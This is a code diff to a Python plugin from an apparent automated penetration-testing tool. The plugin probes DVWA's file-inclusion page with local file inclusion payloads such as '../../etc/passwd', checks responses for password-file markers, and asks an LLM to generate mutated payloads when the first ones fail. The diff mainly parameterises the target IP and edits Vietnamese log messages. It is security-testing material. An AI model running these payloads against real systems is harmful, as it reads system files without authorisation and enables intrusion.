@@ -27,7 +27,8 @@ class DVWALFIPlugin(BasePlugin):
     def match(self, service_info: Dict[str, Any]) -> bool:
         return service_info.get("service", "") in ["http", "https"]
 
-    def _send_payload(self, base_url, payload, cookie):
+    def _send_payload(self, base_url, target_ip, target_port, payload, cookie):
+        """Gửi payload GET và trích xuất nội dung file từ cấu trúc HTML"""
         try:
             encoded_payload = urllib.parse.quote(payload)
             full_url = f"{base_url}?page={encoded_payload}"
@@ -52,7 +53,7 @@ class DVWALFIPlugin(BasePlugin):
             marker_hit = "root:x:" in body or "127.0.0.1 localhost" in body
             
             self.logger.log_transaction(
-                plugin_id=self.METADATA["id"], target_ip="13.229.112.6", target_port=80,
+                plugin_id=self.METADATA["id"], target_ip=target_ip, target_port=target_port,
                 url=full_url, method="GET", payload=payload, req_headers={"Cookie": cookie},
                 res_status=resp.status, res_headers={}, res_body=output, latency=elapsed, marker_hit=marker_hit
             )
@@ -63,7 +64,7 @@ class DVWALFIPlugin(BasePlugin):
     def verify(self, target_ip: str, target_port: int, context: Dict[str, Any]) -> Dict[str, Any]:
         cookie = context.get("session_cookie", "")
         if not cookie:
-            return {"status": "PENDING", "evidence": "Chưa có session cookie"}
+            return {"status": "PENDING", "evidence": "Chưa có session cookie trong shared_context."}
 
         url = f"http://{target_ip}:{target_port}/vulnerabilities/fi/"
         kb_payloads = ["/etc/passwd", "../../etc/passwd"]
@@ -71,7 +72,7 @@ class DVWALFIPlugin(BasePlugin):
 
         print(f"      [LFI-Autonomous] Vòng 1: Kiểm thử bằng Knowledge Base...")
         for payload in kb_payloads:
-            res = self._send_payload(url, payload, cookie)
+            res = self._send_payload(url, target_ip, target_port, payload, cookie)
             if res["hit"]:
                 initial_confirmed = {"payload": payload, "output": res["output"]}
                 break
@@ -82,13 +83,13 @@ class DVWALFIPlugin(BasePlugin):
             ai_plan = groq_generate_payloads(self.METADATA["id"], "lfi_mutation", url, {"telemetry": telemetry_data})
             for item in ai_plan.get("confirm_payloads", []):
                 p_mutated = item.get("payload")
-                res = self._send_payload(url, p_mutated, cookie)
+                res = self._send_payload(url, target_ip, target_port, p_mutated, cookie)
                 if res["hit"]:
                     initial_confirmed = {"payload": p_mutated, "output": res["output"]}
                     break
 
         if not initial_confirmed:
-            return {"status": "FALSE_POSITIVE", "evidence": "Tất cả LFI payload đều thất bại."}
+            return {"status": "FALSE_POSITIVE", "evidence": "Mục tiêu an toàn với các LFI payload thử nghiệm."}
 
         telemetry_summary = self.logger.get_plugin_telemetry(self.METADATA["id"])
         decision = self.engine.calculate_score(
